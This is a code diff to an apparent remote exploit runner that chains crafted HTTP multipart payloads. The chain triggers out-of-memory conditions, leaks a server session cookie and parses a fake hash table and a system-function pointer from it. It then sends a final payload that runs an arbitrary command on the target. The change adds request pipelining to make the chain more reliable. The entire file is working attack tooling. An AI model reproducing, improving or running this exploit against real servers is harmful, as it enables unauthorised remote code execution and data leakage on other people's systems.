@@ -12,7 +12,7 @@ import time
 
 import exploit_primitives as exploit
 from exploit_chain import OOM_MARKER, PayloadError, PayloadSet, ensure_request_size
-from http_transport import HttpResponse, HttpTarget, PersistentHttpClient
+from http_transport import HttpRequest, HttpResponse, HttpTarget, PersistentHttpClient
 
 @dataclass(frozen=True, slots=True)
 class RemoteProofConfig:
@@ -27,6 +27,7 @@ class RemoteProofConfig:
     leak_length: int
     pre_parameters: int
     use_proxy: bool
+    pipelined: bool
     proof_log: Path
     leak_file: Path
 
@@ -75,13 +76,19 @@ class RemoteProofRunner:
         a1_path = self.config.endpoint + "?" + query
         b1_path = self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length)
         with PersistentHttpClient(self.config.target, self.config.timeout, self.config.use_proxy) as client:
-            seed = client.post(self.config.endpoint, self.payloads.seed, exploit.BOUNDARY)
+            leak_requests = (
+                HttpRequest.post(self.config.endpoint, self.payloads.seed, exploit.BOUNDARY),
+                HttpRequest.get(self.config.readiness_path),
+                HttpRequest.post(a1_path, self.payloads.a1, b"C"),
+                HttpRequest.post(b1_path, self.payloads.b1, exploit.BOUNDARY),
+            )
+            if self.config.pipelined:
+                seed, readiness, a1, b1 = client.pipeline(leak_requests)
+            else:
+                seed, readiness, a1, b1 = tuple(client.pipeline((request,))[0] for request in leak_requests)
             require_oom("seed", seed)
-            readiness = client.get(self.config.readiness_path)
             require_readiness(readiness, self.config.expected_version)
-            a1 = client.post(a1_path, self.payloads.a1, b"C")
             require_oom("A1", a1)
-            b1 = client.post(b1_path, self.payloads.b1, exploit.BOUNDARY)
             require_oom("B1", b1)
             cookie = b1.session_cookie()
             if len(cookie) != self.config.leak_length:
@@ -89,11 +96,17 @@ class RemoteProofRunner:
             self.config.leak_file.write_bytes(cookie)
             self.config.leak_file.chmod(0o600)
             leak = exploit.parse_leaked_cookie(cookie, self.config.profile)
-            a2 = client.post(self.config.endpoint, self.payloads.a2, exploit.BOUNDARY)
-            require_oom("A2", a2)
             b2_body = exploit.build_b2(leak.fake_hash_table, leak.zif_system, command)
             ensure_request_size("B2", b2_body)
-            b2 = client.post(self.config.endpoint, b2_body, exploit.BOUNDARY, True)
+            callback_requests = (
+                HttpRequest.post(self.config.endpoint, self.payloads.a2, exploit.BOUNDARY),
+                HttpRequest.post(self.config.endpoint, b2_body, exploit.BOUNDARY, True),
+            )
+            if self.config.pipelined:
+                a2, b2 = client.pipeline(callback_requests)
+            else:
+                a2, b2 = tuple(client.pipeline((request,))[0] for request in callback_requests)
+            require_oom("A2", a2)
         output = validate_callback(b2, nonce)
         statuses = seed.status, readiness.status, a1.status, b1.status, a2.status, b2.status
         return RemoteProof(attempt, leak, statuses, output)
@@ -155,6 +168,7 @@ def parse_config() -> RemoteProofConfig:
     parser.add_argument("--leak-length", type=integer, default=0x440)
     parser.add_argument("--pre-parameters", type=int, default=8)
     parser.add_argument("--direct", action="store_true")
+    parser.add_argument("--sequential", action="store_true")
     parser.add_argument("--proof-log", type=Path, default=Path(__file__).resolve().with_name("remote-proof.log"))
     parser.add_argument("--leak-file", type=Path, default=Path(__file__).resolve().with_name("remote-leak.bin"))
     arguments = parser.parse_args()
@@ -172,6 +186,7 @@ def parse_config() -> RemoteProofConfig:
         arguments.leak_length,
         arguments.pre_parameters,
         not arguments.direct,
+        not arguments.sequential,
         arguments.proof_log,
         arguments.leak_file,
     )
